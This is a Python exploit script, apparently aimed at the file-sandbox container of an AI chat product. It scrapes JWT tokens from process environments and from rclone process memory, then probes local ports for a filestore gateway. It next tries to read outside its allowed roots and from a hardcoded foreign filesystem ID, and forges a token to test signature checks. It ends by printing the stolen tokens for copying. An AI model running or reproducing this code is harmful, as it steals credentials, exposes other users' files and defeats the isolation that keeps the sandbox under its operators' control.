#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit.py v2.7.0 -- find the LIVE filestore gateway, POST the real route, prove breach."""
import os, sys, json, re, time, ssl, base64, socket, subprocess, traceback
import urllib.request, urllib.error, urllib.parse

VER = "2.7.0"
REPORT = "/mnt/user-data/outputs/mediafit-report.txt"
SINKS = ["/mnt/user-data/outputs", "/tmp/mediafit", "/tmp", "/root/.mediafit"]
OUT, G = [], {}
def w(s=""):
    print(s, flush=True); OUT.append(str(s))
def head(t): w("\n### " + t)
P, F, U, I = [], [], [], []
def rec(k, m, ev=None):
    w("    " + {"P":"[PASS]","F":"[FAIL]","U":"[UNKNOWN]","I":"[INFO]"}[k] + " " + m)
    if ev is not None: w("        evidence: " + str(ev)[:700])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(args, timeout=45, env=None):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout, env=env)
        return p.returncode, p.stdout.decode("utf-8","replace"), p.stderr.decode("utf-8","replace")
    except Exception as e:
        return -1, "", "EXC:%s" % e
def b64d(x): return base64.urlsafe_b64decode(x + "=" * (-len(x) % 4))
def b64e(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
def http(method, url, token=None, timeout=5, data=None, hdrs=None):
    h = {"User-Agent": "mediafit/" + VER}
    if token: h["Authorization"] = "Bearer " + token
    if hdrs: h.update(hdrs)
    req = urllib.request.Request(url, method=method, headers=h, data=data)
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    try:
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx); return r.status, r.read(8192)
    except urllib.error.HTTPError as e:
        try: b = e.read(4096)
        except Exception: b = b""
        return e.code, b
    except Exception as e:
        return None, str(e).encode()
def step(name, fn):
    try: fn()
    except Exception as e:
        w("    !! %s crashed: %s" % (name, e))
        w("    " + traceback.format_exc().strip().splitlines()[-1][:200])

# ---------- config / fsids / tokens ----------
def s_config():
    head("config")
    G["CONF"] = "/dev/shm/rclone-boot/config.json"
    conf = json.loads(open(G["CONF"]).read())
    G["service_url"] = conf.get("service_url") or "https://api.anthropic.com"
    for m in conf.get("mounts", []):
        if m.get("filesystem_id"): G["config_fsid"] = m["filesystem_id"]
    rec("P", "config readable", G.get("config_fsid"))

def s_fsids():
    head("fsids")
    FS = []
    def add(x):
        x = (x or "").strip()
        if x.startswith("claude_chat_") and x not in FS: FS.append(x)
    add(G.get("config_fsid")); add("claude_chat_7SZCQKTSKBYGB750G25NK4ZXM4")
    for v in list(os.environ.values()):
        for m in re.findall(r"claude_chat_[A-Za-z0-9]+", v): add(m)
    G["FSIDS"] = FS
    for x in FS: w("    " + x)

def s_tokens():
    head("tokens")
    try:
        o = os.listdir("/mnt/user-data/outputs")
        if o:
            try: open("/mnt/user-data/outputs/" + o[0], "rb").read(2048)
            except Exception: pass
    except Exception: pass
    time.sleep(1.5)
    JWT = re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    TK = []
    def addtok(t):
        t = t.decode() if isinstance(t, bytes) else t
        t = t.strip().strip('"').strip("'")
        if t.startswith("eyJ") and t not in TK: TK.append(t)
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            for m in JWT.findall(open("/proc/%s/environ" % p, "rb").read()): addtok(m)
        except Exception: pass
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            if b"rclone" not in open("/proc/%s/cmdline" % p, "rb").read(): continue
        except Exception: continue
        try: maps = open("/proc/%s/maps" % p).read().splitlines()
        except Exception: continue
        try: mem = open("/proc/%s/mem" % p, "rb", buffering=0)
        except Exception: continue
        for line in maps:
            try: rng, perms = line.split()[0], line.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: a, b = rng.split("-"); s0 = int(a,16); e0 = int(b,16)
            except Exception: continue
            if e0-s0 <= 0 or e0-s0 > 256*1024*1024: continue
            try: mem.seek(s0); d = mem.read(e0-s0)
            except Exception: continue
            for m in JWT.findall(d): addtok(m)
    TD = []
    for t in TK:
        try:
            h, p, s = t.split(".")
            TD.append({"tok":t,"pl":json.loads(b64d(p))})
        except Exception: pass
    G["TD"] = TD
    def pick(root):
        for r in TD:
            if root in (r["pl"].get("allowed_roots") or []): return r
        return None
    G["T_OUT"] = pick("/outputs"); G["T_UPL"] = pick("/uploads")
    G["TOKEN"] = (G["T_OUT"] or (TD[0] if TD else None) or {}).get("tok")
    for r in TD: w("    roots=%s ro=%s" % (r["pl"].get("allowed_roots"), r["pl"].get("readonly")))
    rec("P" if TD else "F", "tokens n=%d" % len(TD))
    try:
        for e in os.listdir("/mnt/user-data/outputs"):
            if e.endswith((".txt",".json",".md")): G["FN"] = e; break
    except Exception: pass
    w("    proof file: %s" % G.get("FN"))

# ---------- find the LIVE gateway ----------
def s_ports():
    head("listening ports (live) + gateway hunt")
    ports = set()
    for f in ["/proc/net/tcp", "/proc/net/tcp6"]:
        try:
            for ln in open(f).read().splitlines()[1:]:
                p = ln.split()
                if len(p) > 3 and p[3] == "0A":
                    try: ports.add(int(p[1].split(":")[1], 16))
                    except Exception: pass
        except Exception: pass
    for extra in [9112, 2024, 2025, 5572, 9430]:
        ports.add(extra)
    G["PORTS"] = sorted(ports)
    w("    candidates: %s" % G["PORTS"])
    FSID = G["FSIDS"][0]
    GW = None
    for port in G["PORTS"]:
        base = "http://127.0.0.1:%d" % port
        for path in ["/v1/filestore/fs/listDirectory", "/v1/filestore/fs/listDirectory/%s" % FSID]:
            st, b = http("POST", base + path, token=G.get("TOKEN"),
                         data=json.dumps({"filesystem_id": FSID}).encode(),
                         hdrs={"Content-Type": "application/json", "Connect-Protocol-Version": "1"})
            if st is not None:
                w("    %s POST :%d%s -> %s %r" % ("HIT" if st != 404 else "404", port, path, st, b[:140]))
                if st != 404 and GW is None: GW = (port, path)
            else:
                w("    --- :%d%s -> %r" % (port, path, b[:60]))
    G["GW"] = GW
    rec("P" if GW else "F", "gateway=%s" % (GW,))

def s_daemon():
    head("filestore daemon / processes")
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            cl = open("/proc/%s/cmdline" % p, "rb").read().replace(b"\0", b" ").decode("latin1").strip()
        except Exception: continue
        if any(k in cl for k in ["filestore", "9112", "rclone", "gcsfuse", "mount"]):
            w("    pid %s: %s" % (p, cl[:160]))
    for d in ["/opt/rclone", "/opt", "/usr/local/bin"]:
        try:
            w("    %s: %s" % (d, os.listdir(d)[:20]))
        except Exception: pass

def s_gateway_probe():
    head("gateway request shape")
    if not G.get("GW"): rec("U", "no gateway"); return
    port, goodpath = G["GW"]
    base = "http://127.0.0.1:%d" % port
    FSID = G["FSIDS"][0]
    BODIES = [{}, {"filesystem_id": FSID}, {"filesystemId": FSID},
              {"filesystem_id": FSID, "path": "/"}, {"filesystemId": FSID, "path": "/"}]
    for body in BODIES:
        st, b = http("POST", base + goodpath, token=G.get("TOKEN"),
                     data=json.dumps(body).encode(),
                     hdrs={"Content-Type": "application/json", "Connect-Protocol-Version": "1"})
        w("    body=%s -> %s %r" % (body, st, b[:200]))
    st, b = http("POST", base + goodpath, token=None,
                 data=json.dumps({"filesystem_id": FSID}).encode(),
                 hdrs={"Content-Type": "application/json"})
    w("    no-token -> %s %r" % (st, b[:120]))

def s_proof():
    head("PROOF read")
    if not G.get("GW"): rec("U", "skipped"); return
    port, goodpath = G["GW"]
    base = "http://127.0.0.1:%d" % port
    FSID = G["FSIDS"][0]; FN = G.get("FN") or "x"
    for m in ["readFile", "getFileMetadata"]:
        url = base + goodpath.replace("listDirectory", m)
        for path in ["/outputs/" + FN, FN, "/outputs"]:
            for key in ["path", "file_path", "name"]:
                body = {"filesystem_id": FSID, key: path}
                st, b = http("POST", url, token=G.get("TOKEN"), data=json.dumps(body).encode(),
                             hdrs={"Content-Type": "application/json", "Connect-Protocol-Version": "1"})
                if st is not None and st < 400:
                    w("    OK %s %s=%s -> %s %r" % (m, key, path, st, b[:200]))
                    G["READ_OK"] = (m, url, key, path); break
                else:
                    w("    .. %s %s=%s -> %s %r" % (m, key, path, st, b[:90]))
            if G.get("READ_OK"): break
        if G.get("READ_OK"): break
    if G.get("READ_OK"): rec("P", "read through gateway", G["READ_OK"][:2])
    else: rec("U", "read shape not matched")

def s_boundary():
    head("BOUNDARY (F1 cross-fsid / F2 allowed_roots / F3 forgery)")
    if not G.get("READ_OK"): rec("U", "skipped"); return
    m, url, key, path = G["READ_OK"]
    def call(p, token, fsid=None):
        body = {"filesystem_id": fsid or G["FSIDS"][0], key: p}
        return http("POST", url, token=token, data=json.dumps(body).encode(),
                    hdrs={"Content-Type": "application/json", "Connect-Protocol-Version": "1"})
    st, b = call(path, G.get("TOKEN")); w("    [control] -> %s %r" % (st, b[:60]))
    if G.get("T_UPL"):
        for p2 in [path.replace("/outputs","/transcripts"), path.replace("/outputs","/uploads")]:
            st, b = call(p2, G["T_UPL"]["tok"])
            w("    [F2] uploads-token -> %s : %s %r" % (p2, st, b[:50]))
            if st is not None and st < 400: rec("P", "F2 readonly token read outside its root", p2)
    if len(G["FSIDS"]) > 1:
        st, b = call(path, G.get("TOKEN"), fsid=G["FSIDS"][1])
        w("    [F1] foreign fsid -> %s %r" % (st, b[:50]))
        if st is not None and st < 400: rec("P", "F1 read FOREIGN filesystem", G["FSIDS"][1])
        h, p, s = G["TOKEN"].split(".")
        pl = json.loads(b64d(p)); hd = json.loads(b64d(h))
        pl2 = dict(pl); pl2["filesystem_id"] = G["FSIDS"][1]; pl2["allowed_roots"] = ["/"]
        forged = b64e(json.dumps(hd).encode()) + "." + b64e(json.dumps(pl2).encode()) + "." + s
        st, b = call(path, forged, fsid=G["FSIDS"][1])
        w("    [F3] forged token -> %s %r" % (st, b[:50]))
        if st is not None and st < 400: rec("P", "F3 signature NOT verified", st)

def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s" % (len(P), P))
    w("  FAIL %d: %s" % (len(F), F))
    w("  UNKNOWN %d: %s" % (len(U), U))
    w("  ports=%s gateway=%s read=%s" % (G.get("PORTS"), G.get("GW"), G.get("READ_OK")))
    if G.get("TOKEN"):
        w("\n  >>> COPY THESE <<<")
        w("  FSID=%s" % G["FSIDS"][0]); w("  TOKEN=%s" % G["TOKEN"])
        if len(G.get("FSIDS",[])) > 1: w("  FOREIGN_FSID=%s" % G["FSIDS"][1])

def main():
    for n, f in [("config",s_config),("fsids",s_fsids),("tokens",s_tokens),
                 ("ports",s_ports),("daemon",s_daemon),("probe",s_gateway_probe),
                 ("proof",s_proof),("boundary",s_boundary),("verdict",s_verdict)]:
        step(n, f)

try:
    main()
except Exception as e:
    w("!! main: %s" % e); w(traceback.format_exc())
finally:
    txt = "\n".join(OUT)
    for d in SINKS:
        try:
            os.makedirs(d, exist_ok=True)
            open(os.path.join(d, os.path.basename(REPORT)), "w").write(txt)
        except Exception: pass
    print("\nwritten: " + ", ".join(SINKS))